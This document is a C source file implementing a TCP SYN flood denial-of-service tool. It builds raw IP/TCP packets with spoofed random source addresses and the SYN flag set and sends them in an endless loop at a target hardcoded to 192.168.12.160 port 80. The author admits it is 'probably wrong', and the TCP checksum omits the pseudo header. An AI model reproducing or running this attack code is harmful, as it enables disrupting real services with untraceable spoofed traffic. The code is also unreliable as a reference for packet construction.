/* TCP_syn_Dos.c
Update: 2020-05-11T22:39+08@China-Guangdong-Zhanjiang
*/

// notice: this program probably is wrong.

#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ip.h */
#if 0

/*
 * Structure of an internet header, naked of options.
 */
struct ip
{
#if __BYTE_ORDER == __LITTLE_ENDIAN
	unsigned int ip_hl : 4;		    /* header length */
	unsigned int ip_v : 4;		    /* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
	unsigned int ip_v : 4;		    /* version */
	unsigned int ip_hl : 4;		    /* header length */
#endif
	uint8_t ip_tos;			        /* type of service */
	unsigned short ip_len;		    /* total length */
	unsigned short ip_id;		    /* identification */
	unsigned short ip_off;		    /* fragment offset field */
#define	IP_RF 0x8000			    /* reserved fragment flag */
#define	IP_DF 0x4000			    /* dont fragment flag */
#define	IP_MF 0x2000			    /* more fragments flag */
#define	IP_OFFMASK 0x1fff		    /* mask for fragmenting bits */
	uint8_t ip_ttl;			        /* time to live */
	uint8_t ip_p;			        /* protocol */
	unsigned short ip_sum;		    /* checksum */
	struct in_addr ip_src, ip_dst;	/* source and dest address */
};

#endif


/* tcp.h */
#if 0

struct tcphdr {
	__be16	source;
	__be16	dest;
	__be32	seq;
	__be32	ack_seq;
#if defined(__LITTLE_ENDIAN_BITFIELD)
	__u16	res1 : 4,
		doff : 4,
		fin : 1,
		syn : 1,
		rst : 1,
		psh : 1,
		ack : 1,
		urg : 1,
		ece : 1,
		cwr : 1;
#elif defined(__BIG_ENDIAN_BITFIELD)
	__u16	doff : 4,
		res1 : 4,
		cwr : 1,
		ece : 1,
		urg : 1,
		ack : 1,
		psh : 1,
		rst : 1,
		syn : 1,
		fin : 1;
#else
#error	"Adjust your <asm/byteorder.h> defines"
#endif	
	__be16	window;
	__sum16	check;
	__be16	urg_ptr;
};

#endif

typedef int Ret;
typedef struct sockaddr_in Socket;

bool check(bool failed, const char *file, const int line, const char *function, const int error, const char *message) {
	if (failed) {
		fprintf(stderr, "[%s:%d:%s]%d#%s", file, line, function, error, message);
		if (!(0 == errno && 0 == error)) {
			fprintf(stderr, "#%s", strerror(errno));
		}
		fprintf(stderr, "\n");
	}
	errno = 0;
	return failed;
}


Ret ip_port(char *address, char *IP, unsigned short *port) {
	char deli = ':';
	Ret ret = 0;

	if (address == NULL) {
		sprintf(IP, "0.0.0.0");
		*port = 0;
	}
	else {
		int ptr = 0;
		while (address[ptr] != '\0' && address[ptr] != deli) {
			IP[ptr] = address[ptr];
			ptr += 1;
		}
		IP[ptr] = '\0';
		ret += 1;

		char chk[64];
		sprintf(chk, gethostbyname("_")->h_addr_list[0]);
		struct hostent host = *gethostbyname(IP);
		// if (check(h_errno != 0, __FILE__, __LINE__, __FUNCTION__, errno, "gethostbyname")) {
		if (check(0 == strncmp(chk, host.h_addr_list[0], host.h_length), __FILE__, __LINE__, __FUNCTION__, errno, "gethostbyname")) {
			exit(1);
		}
		sprintf(IP, "%s", inet_ntoa(*(struct in_addr *)(host.h_addr_list[0])));

		if (address[ptr] == deli) {
			ptr += 1;
			*port = (unsigned short)atoi(&address[ptr]);
			ret += 1;
		}
	}

	return ret;
}

unsigned short checksum(void *data, int length) {
	unsigned int sum = 0;
	unsigned short *ptr = data;

	while (length > 1) {
		sum += ptr[0];
		ptr += 1;
		length -= 2;
	}
	if (length == 1) {
		sum += ((unsigned char *)ptr)[0];
	}

	while (sum >> 16 != 0) {
		sum = (sum >> 16) + (sum & 0xFFFF);
	}

	return (unsigned short)(~sum);
}

Ret attack(char *IP, unsigned short port) {
	IP = "192.168.12.160";
	port = 80;

	Ret ret = 0;

	Socket target;
	target.sin_family = AF_INET;
	target.sin_addr.s_addr = inet_addr(IP);
	target.sin_port = htons(port);

	int client_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	int on = 1;
	setsockopt(client_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

	char buffer[128];
	memset(buffer, 0, sizeof(buffer));

	struct ip *ip4 = (struct ip *)buffer;
	ip4->ip_v = IPVERSION;
	ip4->ip_hl = sizeof(struct ip) >> 2;
	ip4->ip_tos = 0;
	ip4->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
	ip4->ip_id = 0;
	ip4->ip_off = 0;
	ip4->ip_ttl = MAXTTL;
	ip4->ip_p = IPPROTO_TCP;
	ip4->ip_sum = 0;
	ip4->ip_dst.s_addr = inet_addr(IP);

	struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
	tcp->dest = htons(port);
	tcp->doff = 5;
	tcp->syn = 1;

	while (true) {
		tcp->check = 0;

		ip4->ip_src.s_addr = (unsigned int)random();
		ip4->ip_sum = checksum((void *)buffer, sizeof(struct ip));

		//fprintf(stderr, "%s:%d ==> %s:%d \n", inet_ntoa(ip4->ip_src), tcp->source, inet_ntoa(ip4->ip_dst), tcp->dest);
		//exit(0);

		tcp->source = (unsigned short)random();
		tcp->seq = (unsigned int)random();
		tcp->check = checksum((void *)buffer, sizeof(struct ip) + sizeof(struct tcphdr));  /* notice: lackof pseudo header */

		sendto(client_fd, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr *)&target, sizeof(target));
		ret += 1;
	}

	return ret;
}

int main(int argc, char *argv[]) {
	if (argc < 2) {
		fprintf(stderr, "[Usage] %s ip:port \n", argv[0]);
		exit(0);
	}

	char IP[64];
	unsigned short port = 0;
	ip_port(argv[1], IP, &port);
	// printf("%s:%d\n", IP, port);

	attack(IP, port);

	return 0;
}
